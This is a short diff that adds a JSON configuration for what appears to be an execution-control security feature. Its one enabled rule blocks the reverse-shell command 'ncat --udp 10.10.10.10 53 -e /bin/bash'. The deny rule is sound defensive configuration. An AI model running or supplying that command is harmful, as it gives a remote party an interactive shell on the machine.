@@ -1,0 +1,13 @@
+{
+    "exec_control": {
+        "configuration": {
+            "rules": [
+                {
+                    "action": "block",
+                    "command": "ncat --udp 10.10.10.10 53 -e /bin/bash"
+                }
+            ]
+        },
+        "status": "enabled"
+    }
+}
